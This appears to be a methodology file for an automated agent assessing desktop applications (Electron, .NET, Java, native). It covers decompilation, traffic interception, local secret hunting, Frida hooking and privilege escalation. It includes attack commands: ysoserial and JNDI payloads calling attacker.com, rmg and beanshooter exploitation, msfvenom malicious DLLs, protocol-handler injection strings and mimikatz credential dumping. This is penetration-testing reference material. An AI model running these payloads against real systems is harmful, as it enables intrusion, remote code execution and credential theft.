---
name: W_HUNT_THICK_CLIENT
description: Desktop application and thick client security assessment
trigger: Desktop application (Electron, .NET, Java, native) detected
agents: [DesktopAppAgent, ReverseEngineeringAgent, MemoryCorruptionAgent, FirmwareAgent, AuthAgent, APIAgent, SQLiAgent, RCEAgent, DeserializationAgent, CommandInjectionAgent, ValidatorAgent, ExploitChainAgent]
tools: [burp-bridge, credential-vault]
skills_invoked: [ReverseEngineering]
---

# W_HUNT_THICK_CLIENT — Desktop/Thick Client Security Assessment

> Comprehensive methodology for assessing desktop applications and thick clients including Electron, .NET, Java, Qt, and native C/C++ applications. Covers binary analysis, network interception, local storage attacks, runtime manipulation, and framework-specific exploitation.

## References

- OWASP Desktop App Security Top 10
- OWASP Testing Guide v5 (relevant web-layer sections)
- MITRE ATT&CK — Execution, Persistence, Privilege Escalation, Defense Evasion
- CWE entries: CWE-427, CWE-426, CWE-428, CWE-502, CWE-312, CWE-319

---

## PHASE 1: APP PROFILING

**Objective:** Identify the application framework, architecture, dependencies, and attack surface before any testing begins.

### 1.1 Binary Identification

```bash
# Detect It Easy (DIE) — identify compiler, packer, and framework
diec application.exe
diec --json application.exe > die_report.json

# file command (Linux/macOS)
file application.exe
file application.app/Contents/MacOS/application

# Check PE headers (Windows)
# CFF Explorer or PE-bear for manual analysis
python3 -c "import pefile; pe = pefile.PE('application.exe'); print(pe.dump_info())"

# ELF analysis (Linux)
readelf -a application
objdump -x application

# Mach-O analysis (macOS)
otool -L application.app/Contents/MacOS/application
codesign -dv --verbose=4 application.app
```

### 1.2 Framework Detection

| Framework | Detection Signatures |
|-----------|---------------------|
| **Electron** | `electron.exe`, `resources/app.asar`, `node_modules/`, `package.json`, Chrome DevTools protocol |
| **CEF** (Chromium Embedded) | `libcef.dll`, `cef_sandbox.dll`, `cefsimple.exe` |
| **.NET Framework** | `mscorlib.dll` reference, PE metadata `CLR Runtime Header`, `.config` files |
| **.NET Core/5+** | `*.deps.json`, `*.runtimeconfig.json`, `hostfxr.dll` |
| **Java** | `.jar`/`.war` files, `java.exe` process, `META-INF/MANIFEST.MF`, `rt.jar` |
| **Qt** | `Qt5Core.dll`/`Qt6Core.dll`, `qml/` directory, `.qrc` resource files |
| **WPF** | `PresentationFramework.dll`, `.xaml` resources, `wpfgfx_*.dll` |
| **Native C/C++** | No runtime indicators, linked against `msvcrt.dll`/`libc`, check with DIE |
| **Python (PyInstaller)** | `_MEIPASS`, `base_library.zip`, `python3X.dll`, PyInstaller bootloader signature |
| **Go** | Large static binary, `runtime.` symbols, `go.buildid` section |

```bash
# Electron detection
ls resources/app.asar 2>/dev/null && echo "ELECTRON DETECTED"
strings application.exe | grep -i "electron"

# .NET detection
strings application.exe | grep -i "mscorlib\|System.Runtime\|.NETFramework\|.NETCoreApp"

# Java detection
file application.jar  # "Java archive data"
unzip -l application.jar | head -20

# Python/PyInstaller detection
strings application.exe | grep -i "MEIPASS\|pyinstaller"
```

### 1.3 Installer Analysis

```bash
# MSI analysis
msiexec /a installer.msi /qn TARGETDIR=C:\extracted
# Or use lessmsi: lessmsi x installer.msi extracted/

# NSIS installer extraction
7z x installer.exe -otemp_extracted

# InnoSetup extraction
innounp -x installer.exe

# macOS DMG/PKG
hdiutil attach installer.dmg -mountpoint /tmp/mounted
pkgutil --expand installer.pkg /tmp/expanded

# Check installer for:
# - Embedded credentials or API keys
# - Pre/post-install scripts with elevated privileges
# - Insecure file permissions set during installation
# - Registry entries created
# - Services installed
# - Scheduled tasks created
```

### 1.4 File System Footprint Mapping

```bash
# Windows — Process Monitor (Procmon) to capture file/registry activity
# Filter: Process Name is "application.exe"
# Capture: File, Registry, Network operations during launch + usage

# Key locations to examine:
# Windows:
#   %APPDATA%\ApplicationName\
#   %LOCALAPPDATA%\ApplicationName\
#   %PROGRAMDATA%\ApplicationName\
#   %TEMP%\ApplicationName\
#   HKCU\Software\ApplicationName\
#   HKLM\Software\ApplicationName\

# macOS:
#   ~/Library/Application Support/ApplicationName/
#   ~/Library/Preferences/com.company.app.plist
#   ~/Library/Caches/ApplicationName/

# Linux:
#   ~/.config/ApplicationName/
#   ~/.local/share/ApplicationName/
#   /tmp/ApplicationName/

# Map all files created, modified, and read:
# Procmon filter: Operation is "CreateFile" OR "WriteFile" OR "ReadFile"
# Export as CSV for analysis
```

---

## PHASE 2: STATIC ANALYSIS

**Objective:** Decompile, extract strings, find hardcoded secrets, analyze crypto usage, and assess update mechanisms.

### 2.1 Decompilation by Framework

**Electron — ASAR Extraction:**
```bash
# Install asar tool
npm install -g @electron/asar

# Extract the application archive
asar extract resources/app.asar extracted_app/

# Search for secrets in extracted source
grep -rn "api[_-]key\|secret\|password\|token\|apikey\|auth" extracted_app/
grep -rn "BEGIN.*PRIVATE KEY" extracted_app/
grep -rn "mongodb://\|postgres://\|mysql://\|redis://" extracted_app/

# Check package.json for dependencies with known vulnerabilities
cd extracted_app && npm audit --json > audit_report.json

# Check for nodeIntegration and contextIsolation settings
grep -rn "nodeIntegration\|contextIsolation\|enableRemoteModule\|webSecurity" extracted_app/
```

**.NET — dnSpy / ILSpy Decompilation:**
```bash
# dnSpy (GUI) — open the .exe or .dll directly
# Exports full C# source code, browse classes, methods, strings

# ILSpy (CLI alternative)
ilspycmd application.exe -o decompiled_source/

# dotPeek (JetBrains) — alternative decompiler

# Search decompiled source for secrets:
grep -rn "ConnectionString\|Password\|ApiKey\|Secret\|Token" decompiled_source/
grep -rn "Crypto\|Encrypt\|Decrypt\|AES\|DES\|MD5\|SHA" decompiled_source/

# Check for deserialization sinks:
grep -rn "BinaryFormatter\|XmlSerializer\|JavaScriptSerializer\|Json.NET\|TypeNameHandling" decompiled_source/
grep -rn "ObjectStateFormatter\|LosFormatter\|SoapFormatter\|NetDataContractSerializer" decompiled_source/
```

**Java — JD-GUI / CFR / Procyon:**
```bash
# Extract JAR
jar xf application.jar

# Decompile with CFR
java -jar cfr.jar application.jar --outputdir decompiled/

# Decompile with Procyon
java -jar procyon-decompiler.jar application.jar -o decompiled/

# JD-GUI — open JAR directly in GUI for browsing

# Search for secrets:
grep -rn "password\|secret\|apikey\|jdbc:" decompiled/
grep -rn "getConnection\|DriverManager" decompiled/

# Check for deserialization:
grep -rn "ObjectInputStream\|readObject\|XMLDecoder\|XStream\|SnakeYAML" decompiled/

# Check for JNDI injection points:
grep -rn "InitialContext\|lookup\|Context.PROVIDER_URL" decompiled/
```

### 2.2 String Extraction

```bash
# Extract all strings from binary
strings -n 8 application.exe > strings_output.txt
strings -n 8 -el application.exe >> strings_output.txt  # UTF-16 LE strings

# Search for high-value patterns
grep -iE "(password|passwd|secret|token|api.?key|auth|bearer|jwt|session)" strings_output.txt
grep -iE "(https?://|ftp://|ssh://|mongodb://|mysql://|postgres://)" strings_output.txt
grep -iE "([A-Za-z0-9+/]{40,}={0,2})" strings_output.txt  # Base64 blobs
grep -iE "(AKIA[0-9A-Z]{16})" strings_output.txt  # AWS access keys
grep -iE "(ghp_[A-Za-z0-9]{36})" strings_output.txt  # GitHub PATs
grep -iE "-----BEGIN" strings_output.txt  # Private keys/certificates

# FLOSS — FLARE Obfuscated String Solver (for obfuscated strings)
floss application.exe > floss_output.txt
```

### 2.3 Certificate Validation Analysis

```bash
# Check for certificate pinning implementation:
grep -rn "X509Certificate\|SslStream\|ServerCertificateValidation\|checkServerTrusted" decompiled/

# Check for certificate validation bypass (dangerous patterns):
grep -rn "return true\|TrustAll\|AcceptAll\|ALLOW_ALL\|InsecureSkipVerify" decompiled/
grep -rn "ServicePointManager.ServerCertificateValidationCallback" decompiled/  # .NET
grep -rn "TrustManager\|X509TrustManager\|checkServerTrusted.*{}" decompiled/  # Java
```

### 2.4 Update Mechanism Analysis

```bash
# Search for update URLs and logic:
grep -rn "update\|upgrade\|download\|patch\|version" decompiled/ | grep -i "http\|url\|endpoint"

# Check if updates are fetched over HTTPS
# Check if update packages are signed/verified
# Check if update process runs with elevated privileges
# Test for update hijacking:
# - DNS spoofing the update server
# - MITM the update download (if HTTP)
# - Replace the update package in transit
# - DLL side-loading via update directory
```

---

## PHASE 3: NETWORK ANALYSIS

**Objective:** Intercept, analyze, and manipulate all network traffic between the application and backend services.

### 3.1 Proxy Configuration

```bash
# Set system proxy for the application:
# Windows: System Settings > Proxy > Manual proxy (127.0.0.1:8080)
# macOS: System Preferences > Network > Advanced > Proxies

# Environment variable proxy (for apps that respect it):
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# Proxifier — force proxy for any application (Windows/macOS)
# Configure Proxifier rule: application.exe -> HTTPS 127.0.0.1:8080

# Burp Suite configuration:
# 1. Import Burp CA certificate into system trust store
# 2. Enable invisible proxying if app doesn't honor proxy settings
# 3. Configure TLS pass-through for certificate-pinned hosts

# iptables redirect (Linux — force traffic through proxy):
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8080
iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8080
```

### 3.2 Certificate Pinning Bypass

```bash
# .NET — Patch ServerCertificateValidationCallback:
# In dnSpy, find and modify the certificate validation method to return true

# Java — Disable certificate checking:
# Use Frida or modify TrustManager implementation
# Or add -Dcom.sun.net.ssl.checkRevocation=false JVM flag

# Electron — Disable certificate verification:
# Set environment variable: NODE_TLS_REJECT_UNAUTHORIZED=0
# Or patch app.asar to add: app.commandLine.appendSwitch('ignore-certificate-errors')

# Universal — mitmproxy with custom scripts:
mitmproxy --mode transparent --set ssl_insecure=true

# Frida-based SSL pinning bypass:
frida -l ssl_bypass.js -f application.exe
# Script: https://github.com/httptoolkit/frida-interception-and-unpinning
```

### 3.3 API Discovery and Analysis

```bash
# Capture all API endpoints in Burp Suite:
# Target > Site Map — review all discovered endpoints

# Wireshark capture for non-HTTP protocols:
wireshark -i any -f "host target-server.com" -w capture.pcap

# tshark for CLI capture:
tshark -i any -f "host target-server.com" -T json > traffic.json

# Analyze captured traffic:
# - Identify authentication mechanism (JWT, session cookie, API key, OAuth)
# - Map all API endpoints and methods
# - Check for sensitive data in transit (PII, credentials, tokens)
# - Look for GraphQL introspection queries
# - Check for WebSocket connections
# - Identify non-standard protocols (gRPC, protobuf, msgpack, custom binary)
```

### 3.4 Protocol Analysis

```bash
# gRPC / Protocol Buffers:
# Use grpcurl to interact with gRPC services
grpcurl -plaintext target:50051 list
grpcurl -plaintext target:50051 describe ServiceName

# Decode protobuf messages:
protoc --decode_raw < captured_message.bin

# WebSocket analysis:
# Use Burp Suite WebSocket history or wscat:
wscat -c wss://target.com/ws

# Custom binary protocol:
# Use Wireshark with custom dissector or analyze in hex
xxd captured_traffic.bin | head -50
```

---

## PHASE 4: LOCAL STORAGE ANALYSIS

**Objective:** Examine all local data stores for sensitive information, insecure storage, and exploitable configurations.

### 4.1 Configuration Files

```bash
# Search for configuration files:
find /path/to/app -name "*.config" -o -name "*.xml" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.ini" -o -name "*.properties" -o -name "*.toml" 2>/dev/null

# Windows — check app.config, web.config patterns:
type "%APPDATA%\AppName\settings.json"
type "%LOCALAPPDATA%\AppName\config.xml"

# Check for plaintext credentials in config:
grep -rniE "(password|secret|token|key|connectionstring)" /path/to/app/config/

# Check file permissions on config files:
# Windows: icacls config_file
# Linux/macOS: ls -la config_file
```

### 4.2 Registry Analysis (Windows)

```powershell
# Export application registry entries:
reg export "HKCU\Software\AppName" app_registry.reg
reg export "HKLM\Software\AppName" app_registry_lm.reg

# Search for sensitive data in registry:
reg query "HKCU\Software\AppName" /s | findstr /i "password secret token key"

# Check for stored credentials:
reg query "HKCU\Software\AppName\Credentials" /s
# Also check: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# Process Monitor — filter for RegQueryValue operations during login
# to identify where credentials are read from
```

### 4.3 SQLite Database Analysis

```bash
# Find SQLite databases:
find /path/to/app -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# Electron apps often use SQLite:
sqlite3 "%APPDATA%/AppName/databases/app.db" ".tables"
sqlite3 "%APPDATA%/AppName/databases/app.db" ".schema"
sqlite3 "%APPDATA%/AppName/databases/app.db" "SELECT * FROM users;"
sqlite3 "%APPDATA%/AppName/databases/app.db" "SELECT * FROM sessions;"
sqlite3 "%APPDATA%/AppName/databases/app.db" "SELECT * FROM tokens;"

# Check for sensitive data:
sqlite3 app.db "SELECT name FROM sqlite_master WHERE type='table';"
# Dump each table and search for credentials, tokens, PII
```

### 4.4 Credential Storage Assessment

```bash
# Windows Credential Manager:
cmdkey /list
# Or use mimikatz: sekurlsa::credman

# Windows DPAPI protected storage:
# Check for DPAPI-encrypted blobs in app data directories
# Use dpapi.py (Impacket) or mimikatz to attempt decryption

# macOS Keychain:
security find-generic-password -s "AppName" -g 2>&1
security dump-keychain -d login.keychain

# Linux — check for gnome-keyring or kwallet usage:
# secret-tool search application AppName

# Check for credentials stored in plaintext files:
grep -rn "password\|token\|secret\|api_key" ~/.config/AppName/ /tmp/ /var/tmp/
```

### 4.5 Log File Analysis

```bash
# Find and analyze log files:
find /path/to/app -name "*.log" -o -name "*.txt" -name "*log*" 2>/dev/null

# Search logs for sensitive data:
grep -rniE "(password|token|bearer|authorization|cookie|session|secret|api.?key)" /path/to/app/logs/
grep -rniE "(error|exception|stack.?trace|debug)" /path/to/app/logs/ | head -50

# Check if application logs sensitive user input
# Check if debug logging is enabled in production builds
```

### 4.6 IPC Mechanisms

```bash
# Named Pipes (Windows):
# Use PipeList from Sysinternals:
pipelist.exe | findstr /i "appname"

# Or use Process Explorer > Handle view to see pipe handles

# Test named pipe permissions:
# Use accesschk from Sysinternals:
accesschk.exe -w \pipe\AppNamePipe

# Unix domain sockets:
find /tmp /var/run -name "*.sock" 2>/dev/null
ls -la /tmp/appname.sock  # Check permissions

# D-Bus (Linux):
dbus-monitor --session "type='signal',interface='com.appname'"

# COM objects (Windows):
# Use OleView or OleViewDotNet to enumerate registered COM objects
# Check for insecure COM permissions
```

---

## PHASE 5: RUNTIME ANALYSIS

**Objective:** Attach debuggers, analyze memory, hook functions, and manipulate application behavior at runtime.

### 5.1 Debugger Attachment

```bash
# x64dbg (Windows) — attach to running process:
# 1. File > Attach > Select process
# 2. Set breakpoints on interesting functions:
#    - Crypto functions: CryptEncrypt, CryptDecrypt, BCryptEncrypt
#    - Network functions: send, recv, WSASend, WSARecv
#    - Authentication: LogonUser, CredRead, CredWrite
#    - File operations: CreateFile, ReadFile, WriteFile

# GDB (Linux/macOS):
gdb -p $(pgrep application)
# Set breakpoints:
# (gdb) break SSL_write
# (gdb) break SSL_read
# (gdb) break strcmp  # Catch string comparisons (license checks, auth)
# (gdb) continue

# lldb (macOS):
lldb -p $(pgrep application)
# (lldb) breakpoint set -n SSL_write
# (lldb) continue

# WinDbg (Windows):
# .attach <PID>
# bp kernel32!CreateFileW  # Break on file creation
# bp ws2_32!send           # Break on network send
# g                        # Continue execution
```

### 5.2 Memory Analysis

```bash
# Dump process memory:
# Windows: procdump -ma application.exe app_dump.dmp
# Linux: gcore -o app_dump $(pgrep application)
# macOS: lldb -p PID -o "process save-core app_dump.core" -o "quit"

# Search memory dump for secrets:
strings app_dump.dmp | grep -iE "(password|token|secret|bearer|api.?key)"
strings app_dump.dmp | grep -iE "(https?://.*@|jdbc:|mongodb://)"

# Volatility for structured analysis:
vol.py -f app_dump.dmp windows.pslist
vol.py -f app_dump.dmp windows.netscan

# Check for sensitive data remaining in memory after logout:
# 1. Login to the application
# 2. Dump memory — note credential locations
# 3. Logout
# 4. Dump memory again — check if credentials are still present
# Finding: credentials in memory post-logout = CWE-316
```

### 5.3 Function Hooking with Frida

```bash
# Install Frida
pip install frida-tools

# Attach to running process:
frida -p $(pgrep application)

# Hook a specific function to log arguments:
frida -l hook_script.js -p $(pgrep application)
```

```javascript
// hook_script.js — Example: Hook authentication function
// .NET example:
var module = Process.getModuleByName("application.exe");
Interceptor.attach(Module.findExportByName("user32.dll", "MessageBoxW"), {
    onEnter: function(args) {
        console.log("[MessageBoxW] Title: " + args[1].readUtf16String());
        console.log("[MessageBoxW] Text: " + args[2].readUtf16String());
    }
});

// Hook send() to capture outgoing network data:
Interceptor.attach(Module.findExportByName("ws2_32.dll", "send"), {
    onEnter: function(args) {
        var buf = args[1];
        var len = args[2].toInt32();
        console.log("[send] " + len + " bytes:");
        console.log(hexdump(buf, { length: len }));
    }
});

// Hook CryptDecrypt to capture decrypted data:
Interceptor.attach(Module.findExportByName("advapi32.dll", "CryptDecrypt"), {
    onLeave: function(retval) {
        var pbData = this.context.r8;  // Adjust register per calling convention
        console.log("[CryptDecrypt] Decrypted data:");
        console.log(hexdump(pbData, { length: 256 }));
    }
});
```

### 5.4 API Monitor (Windows)

```
# API Monitor — capture all API calls made by the application:
# 1. Launch API Monitor
# 2. Select API categories to monitor:
#    - Cryptography (CryptoAPI, CNG)
#    - Internet (WinINet, WinHTTP)
#    - Registry
#    - File System
#    - Security and Identity
#    - Network (Winsock)
# 3. Attach to process or launch application through API Monitor
# 4. Filter for interesting calls:
#    - CryptEncrypt / CryptDecrypt — data encryption/decryption
#    - HttpSendRequest — HTTP requests with headers
#    - RegSetValueEx — registry writes
#    - CreateFile / WriteFile — file operations
# 5. Look for:
#    - Plaintext credentials in API parameters
#    - Weak crypto algorithms (DES, RC4, MD5)
#    - Insecure file/registry operations
```

### 5.5 Process Monitor (Procmon)

```
# Sysinternals Process Monitor:
# 1. Launch Procmon with admin privileges
# 2. Set filter: Process Name is "application.exe"
# 3. Capture categories: File System, Registry, Network, Process
# 4. Perform actions in the application (login, data access, etc.)
# 5. Analyze captured events:
#    - File reads/writes — where does it store data?
#    - Registry access — what configuration does it read?
#    - Network connections — where does it connect?
#    - Process/Thread creation — does it spawn child processes?
# 6. Look for:
#    - DLL load order (for DLL hijacking)
#    - Temp file creation with sensitive data
#    - Insecure file permissions
#    - Missing DLLs (DLL planting opportunity)
#    - PATH-based DLL search order exploitation
```

---

## PHASE 6: ELECTRON-SPECIFIC ATTACKS

**Objective:** Exploit Electron framework misconfigurations and bypass security boundaries.

### 6.1 Node Integration Assessment

```bash
# Extract and check main process configuration:
asar extract resources/app.asar extracted/

# Check BrowserWindow configuration:
grep -rn "nodeIntegration" extracted/
grep -rn "contextIsolation" extracted/
grep -rn "enableRemoteModule" extracted/
grep -rn "webSecurity" extracted/
grep -rn "allowRunningInsecureContent" extracted/
grep -rn "sandbox" extracted/

# Dangerous configurations:
# nodeIntegration: true          — allows renderer to access Node.js APIs
# contextIsolation: false        — preload script shares context with web page
# webSecurity: false             — disables same-origin policy
# enableRemoteModule: true       — allows renderer to use remote module
# sandbox: false                 — no process sandboxing
```

### 6.2 Context Isolation Bypass

```javascript
// If contextIsolation is false, the renderer can access Node.js:
// Test in DevTools console (if accessible):
require('child_process').exec('calc.exe');
require('child_process').exec('id');

// If contextIsolation is true but nodeIntegration is true:
// Look for prototype pollution in preload scripts:
// Overwrite Object.prototype to escape context bridge

// Preload script analysis — check for exposed APIs:
// Search for contextBridge.exposeInMainWorld calls
grep -rn "contextBridge\|exposeInMainWorld" extracted/

// Check if exposed APIs allow command execution:
// e.g., exposed file system APIs, shell.openExternal, etc.
```

### 6.3 Preload Script Abuse

```bash
# Analyze preload scripts:
grep -rn "preload" extracted/main.js extracted/index.js

# Common preload vulnerabilities:
# 1. Exposing dangerous Node.js modules (fs, child_process, os)
# 2. Passing unsanitized data to Node.js functions
# 3. eval() or Function() with user-controlled input
# 4. Exposing IPC handlers that execute arbitrary commands

# Check IPC handlers:
grep -rn "ipcMain.handle\|ipcMain.on" extracted/
grep -rn "ipcRenderer.send\|ipcRenderer.invoke" extracted/
# Test each IPC channel for parameter injection
```

### 6.4 DevTools and Debug Access

```bash
# Check if DevTools is accessible:
# Try keyboard shortcut: Ctrl+Shift+I or F12
# Check for --inspect flag in process arguments:
wmic process where "name='electron.exe'" get CommandLine

# Remote debugging:
# Check if debug port is open:
nmap -p 9222,9229 localhost
# If open: chrome://inspect or DevTools protocol

# Launch with debugging enabled:
application.exe --inspect=0.0.0.0:9229
# Then connect: chrome://inspect in Chrome

# Check for debug menu or hidden admin features:
grep -rn "isDev\|isDebug\|debugMode\|ELECTRON_IS_DEV" extracted/
```

### 6.5 Deep Link / Custom Protocol Handler Abuse

```bash
# Check registered protocol handlers:
# Windows: HKCR\appname\shell\open\command
reg query "HKCR" /s /f "application" | findstr "URL Protocol"

# Test for command injection via custom protocol:
# appname://;calc.exe
# appname://$(calc.exe)
# appname://%00calc.exe
# appname://--inspect=0.0.0.0:9229

# Check if shell.openExternal is used with user-controlled URLs:
grep -rn "openExternal\|shell.open" extracted/
```

---

## PHASE 7: .NET-SPECIFIC ATTACKS

**Objective:** Exploit .NET framework vulnerabilities including deserialization, assembly manipulation, and binary patching.

### 7.1 Assembly Decompilation and Analysis

```bash
# dnSpy — full decompilation and debugging:
# 1. Open .exe/.dll in dnSpy
# 2. Browse namespaces > classes > methods
# 3. Search (Ctrl+Shift+K) for:
#    - "password", "secret", "key", "token"
#    - "Decrypt", "Encrypt", "Hash"
#    - "SqlConnection", "SqlCommand"
#    - "HttpClient", "WebRequest"
#    - "Deserialize", "BinaryFormatter"

# ILSpy command-line:
ilspycmd application.exe -o ./decompiled/
ilspycmd application.dll --type "Namespace.ClassName" -o ./decompiled/

# Check for obfuscation:
# Look for mangled names, control flow flattening, string encryption
# Common obfuscators: Dotfuscator, ConfuserEx, SmartAssembly
# De-obfuscate with de4dot:
de4dot application.exe -o application_clean.exe
```

### 7.2 IL Manipulation and Binary Patching

```bash
# dnSpy — edit and recompile:
# 1. Right-click method > Edit Method Body (IL) or Edit Method (C#)
# 2. Common patches:
#    - License check: Change "brfalse" to "brtrue" (invert branch)
#    - Authentication: Make IsAuthenticated always return true
#    - Feature flags: Change false to true
#    - Certificate validation: Make callback return true
# 3. File > Save Module

# Reflexil (ILSpy plugin) — IL-level editing:
# Edit individual IL instructions
# Replace, insert, or delete instructions

# Mono.Cecil for programmatic patching:
# C# script to patch assemblies automatically
```

### 7.3 Deserialization Attacks

```bash
# Check for vulnerable deserialization sinks:
grep -rn "BinaryFormatter\|SoapFormatter\|ObjectStateFormatter" decompiled/
grep -rn "LosFormatter\|NetDataContractSerializer" decompiled/
grep -rn "XmlSerializer.*typeof\|JavaScriptSerializer\|DataContractSerializer" decompiled/
grep -rn "JsonConvert.DeserializeObject.*TypeNameHandling" decompiled/
grep -rn "TypeNameHandling.All\|TypeNameHandling.Auto\|TypeNameHandling.Objects" decompiled/

# Generate exploitation payloads with ysoserial.net:
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami > C:\proof.txt"
ysoserial.exe -g PSObject -f BinaryFormatter -c "calc.exe"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc.exe"

# Test by injecting payload into deserialization input:
# - Intercepted network traffic
# - Local file (ViewState, config)
# - Clipboard, drag-drop data
# - IPC message
```

### 7.4 .NET Remoting Attacks

```bash
# Check for .NET Remoting endpoints:
grep -rn "RemotingConfiguration\|TcpChannel\|HttpChannel\|IpcChannel" decompiled/
grep -rn "RegisterChannel\|RegisterWellKnownServiceType" decompiled/

# If remoting is exposed, use ExploitRemotingService:
ExploitRemotingService.exe -s tcp://target:port/ServiceName -c "calc.exe"
```

---

## PHASE 8: JAVA-SPECIFIC ATTACKS

**Objective:** Exploit Java application vulnerabilities including deserialization, JNDI injection, and RMI/JMX attacks.

### 8.1 JAR Analysis

```bash
# Extract JAR contents:
jar xf application.jar
unzip application.jar -d extracted/

# Analyze MANIFEST.MF:
cat META-INF/MANIFEST.MF
# Check: Main-Class, Class-Path, sealed packages

# Decompile with CFR:
java -jar cfr.jar application.jar --outputdir decompiled/

# Decompile with Procyon:
java -jar procyon-decompiler.jar -jar application.jar -o decompiled/

# JADX for Android-style analysis (works on desktop JARs too):
jadx -d decompiled/ application.jar

# Search for vulnerabilities:
grep -rn "Runtime.getRuntime().exec\|ProcessBuilder" decompiled/
grep -rn "Class.forName\|Method.invoke\|Constructor.newInstance" decompiled/
grep -rn "ScriptEngine\|eval(" decompiled/
```

### 8.2 Java Deserialization Attacks

```bash
# Check for deserialization sinks:
grep -rn "ObjectInputStream\|readObject\|readUnshared" decompiled/
grep -rn "XMLDecoder\|XStream\|SnakeYAML\|load(" decompiled/
grep -rn "Kryo\|Hessian\|Burlap\|AMF" decompiled/

# Generate payloads with ysoserial:
java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.bin
java -jar ysoserial.jar CommonsCollections5 "cmd /c whoami > C:\\proof.txt" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "curl https://attacker.com/confirm" > payload.bin
java -jar ysoserial.jar Jdk7u21 "calc.exe" > payload.bin

# Check which gadget chains are available by examining dependencies:
grep -rn "commons-collections\|spring-\|groovy\|beanutils" pom.xml build.gradle

# JNDI Deserialization:
java -jar ysoserial.jar JRMPClient "attacker.com:1099" > jrmp_payload.bin
```

### 8.3 JNDI Injection

```bash
# Check for JNDI lookup with user-controlled input:
grep -rn "InitialContext\|Context.lookup\|ctx.lookup" decompiled/
grep -rn "JndiLookup\|JMSAppender\|JDBCAppender" decompiled/

# Set up JNDI exploitation server:
# Use marshalsec:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# Test JNDI injection payloads:
# ${jndi:ldap://attacker.com:1389/exploit}
# ${jndi:rmi://attacker.com:1099/exploit}
# ${jndi:dns://attacker.com/test}  # Safe — DNS only, for detection

# Log4Shell patterns (if Log4j is present):
grep -rn "log4j" decompiled/ pom.xml build.gradle
# Test: ${jndi:ldap://COLLABORATOR/test}
```

### 8.4 RMI and JMX Attacks

```bash
# Scan for RMI registry:
nmap -p 1099 target -sV
# Or use: rmg (Remote Method Guesser)
java -jar rmg.jar enum target 1099

# JMX remote access:
nmap -p 9010,9011 target -sV
# Connect with jconsole or custom JMX client

# RMI exploitation:
java -jar rmg.jar exploit target 1099 CommonsCollections6 "calc.exe"
java -jar rmg.jar codebase target 1099 "http://attacker.com/" ExploitClass

# Beanshooter for JMX exploitation:
java -jar beanshooter.jar enum target 9010
java -jar beanshooter.jar deploy target 9010 mlet "http://attacker.com/mlet.html"
```

---

## PHASE 9: PRIVILEGE ESCALATION

**Objective:** Escalate from normal user to SYSTEM/root via application-level misconfigurations.

### 9.1 DLL Hijacking

```bash
# Use Procmon to find missing DLLs:
# Filter: Process Name is "application.exe" AND Result is "NAME NOT FOUND" AND Path ends with ".dll"

# Check DLL search order:
# 1. Application directory
# 2. System directory (C:\Windows\System32)
# 3. 16-bit system directory
# 4. Windows directory
# 5. Current directory
# 6. PATH directories

# Generate malicious DLL:
msfvenom -p windows/x64/exec CMD="cmd.exe /c whoami > C:\proof.txt" -f dll -o malicious.dll

# Or use DLL hijack template:
# compile a DLL that proxies to the real DLL while executing payload

# Check for writable application directory:
icacls "C:\Program Files\ApplicationName\"
# If BUILTIN\Users has write access — DLL plant is possible

# Common hijackable DLLs:
# VERSION.dll, USERENV.dll, WINMM.dll, WTSAPI32.dll, dbghelp.dll
```

### 9.2 Unquoted Service Paths

```powershell
# Find unquoted service paths:
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Example: C:\Program Files\App Name\service.exe
# Can be exploited by placing: C:\Program.exe or C:\Program Files\App.exe

# Check service permissions:
sc qc ServiceName
accesschk.exe -ucqv ServiceName

# If service runs as SYSTEM and path is unquoted:
# Place malicious executable in exploitable path position
```

### 9.3 Writable Installation Directories

```powershell
# Check permissions on install directory:
icacls "C:\Program Files\ApplicationName" /T

# Check for writable files in program directory:
accesschk.exe -w -s "C:\Program Files\ApplicationName" -accepteula

# If writable: replace legitimate executables or DLLs with malicious versions
# Check if application runs with elevated privileges or as a service
```

### 9.4 Update Mechanism Abuse

```bash
# Analyze update process:
# 1. Monitor update check with Procmon and Wireshark
# 2. Identify update server URL
# 3. Check for:
#    - HTTP (not HTTPS) update channel — MITM opportunity
#    - Missing signature verification on update packages
#    - Update runs with elevated privileges
#    - Temp directory used for update staging is writable
#    - Time-of-check-time-of-use (TOCTOU) race condition

# Test update hijacking:
# DNS spoof update server → serve malicious update
# If HTTP: Burp intercept → modify update package in transit
# Replace update binary in writable temp directory before execution
```

### 9.5 Named Pipe Impersonation

```powershell
# Enumerate named pipes:
[System.IO.Directory]::GetFiles("\\.\\pipe\\")
# Or use pipelist.exe from Sysinternals

# Check pipe permissions:
accesschk.exe -w \pipe\AppNamePipe

# If a privileged service reads from a pipe that a low-privilege user can write to:
# Use named pipe impersonation to escalate privileges

# Tools:
# - PrintSpoofer
# - JuicyPotato / RoguePotato / GodPotato (SeImpersonatePrivilege)
# - Named Pipe impersonation via custom .NET/C code
```

### 9.6 Ghidra Analysis for Native Binaries

```bash
# Ghidra — reverse engineering for native (C/C++) applications:
# 1. Create new project
# 2. Import binary: File > Import File > application.exe
# 3. Auto-analyze: Yes to all analysis options
# 4. Key analysis steps:
#    - Check Symbol Tree for exported functions
#    - Search > For Strings — find hardcoded values
#    - Search > For Scalars — find magic numbers, port numbers
#    - Window > Function Call Graph — trace execution paths
#    - Right-click function > References > Find References To — cross-references

# Focus areas:
# - Authentication routines (strcmp, memcmp for password checks)
# - Crypto functions (identify algorithm by constants: AES S-box, SHA round constants)
# - Network functions (connect, send, recv, socket)
# - File operations (fopen, fread, fwrite)
# - Dangerous functions (strcpy, sprintf, gets — buffer overflow candidates)

# Ghidra scripting for automation:
# Use Ghidra's Jython/Java scripting for batch analysis
